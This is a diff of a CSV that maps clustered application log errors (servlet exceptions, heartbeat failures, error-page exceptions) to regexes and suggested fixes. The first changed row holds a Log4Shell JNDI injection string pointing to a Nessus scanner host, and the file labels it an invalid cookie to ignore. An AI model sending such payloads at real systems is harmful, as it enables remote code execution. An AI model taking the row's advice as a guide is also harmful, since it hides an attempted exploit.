@@ -1,5 +1,5 @@
 Cluster,Error Example,Error Regex,Error Solution
-1.0,a cookie header was received [${jndi:ldap://log4shell-generic-8molyf0ab2aqtscsyugh${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-8molyf0ab2aqtscsyugh${lower:ten}.w.nessus.org/nessus};],cookie header was received.*invalid cookie,Ignore the invalid cookie in the received header.
+1.0,a cookie header was received [${jndi:ldap://log4shell-generic-8molyf0ab2aqtscsyugh${lower:ten}.w.nessus.org/nessus}=${jndi:ldap://log4shell-generic-8molyf0ab2aqtscsyugh${lower:ten}.w.nessus.org/nessus};] invalid cookie,cookie header.*,Ignore the invalid cookie in the received header.
 2.0,servlet.service() for servlet [dispatcherservlet] in context with path [] threw exception,servlet.service\(\) for servlet \[dispatcherservlet\] threw exception,Handle the exception thrown by the servlet service.
 3.0,discoveryclient_rdd-async-service/p1049433.prod.cloud.fedex.com:rdd-async-service:6521 - was unable to send heartbeat!,discoveryclient.*unable to send heartbeat,Investigate and resolve the issue related to sending heartbeat.
 4.0,"exception processing errorpage[errorcode=0, location=/error]",exception processing errorpage\[errorcode=\d+.*location=\/error\],Handle the exception in the error processing code.
